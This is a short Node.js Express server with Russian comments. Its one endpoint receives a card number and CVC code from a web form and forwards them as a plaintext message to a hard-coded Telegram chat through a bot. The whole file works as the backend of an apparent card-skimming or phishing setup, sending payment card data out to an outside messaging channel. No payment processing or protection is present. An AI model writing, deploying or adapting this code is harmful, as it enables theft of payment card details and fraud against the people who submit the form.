const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const TelegramBot = require("node-telegram-bot-api");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 3000;

// Инициализируем Telegram-бот
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Middleware для парсинга JSON
app.use(bodyParser.json());

// Обработка POST-запроса с данными из формы
app.post("/submit", (req, res) => {
  const { cardNumber, cvc } = req.body;

  // Отправляем данные в Telegram-чат
  const chatId = "1326984416"; // Замените на ID вашего чата
  const message = `Получены данные из формы:\n\nНомер карты: ${cardNumber}\nCVC код: ${cvc}`;

  bot
    .sendMessage(chatId, message)
    .then(() => {
      console.log("Данные успешно отправлены в Telegram-чат.");
      res.sendStatus(200);
    })
    .catch((error) => {
      console.error("Ошибка при отправке данных в Telegram:", error);
      res.sendStatus(500);
    });
});

app.listen(port, () => {
  console.log(`Сервер запущен на порту ${port}`);
});
